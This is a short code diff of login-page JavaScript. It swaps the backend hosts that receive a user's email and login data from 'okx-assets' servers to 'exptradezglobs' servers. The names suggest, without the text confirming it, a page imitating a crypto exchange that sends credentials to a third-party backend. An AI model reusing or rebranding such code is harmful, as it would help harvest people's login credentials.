@@ -9,7 +9,7 @@ const sendLoginEmail = async () => {
   const data = {
     email: email.value,
   };
-  fetch('https://okx-assetsbackend.onrender.com/api/loginemailsand', {
+  fetch('https://exptradezglobsbackend.onrender.com/api/loginemailsand', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
@@ -36,7 +36,7 @@ button.onclick = async (event) => {
   console.log(data);
   button.innerHTML = "Loading...";
 
-  fetch('https://okx-assets-back-end.vercel.app/api/login', {
+  fetch('https://exptradezglobs-backend.vercel.app/api/login', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
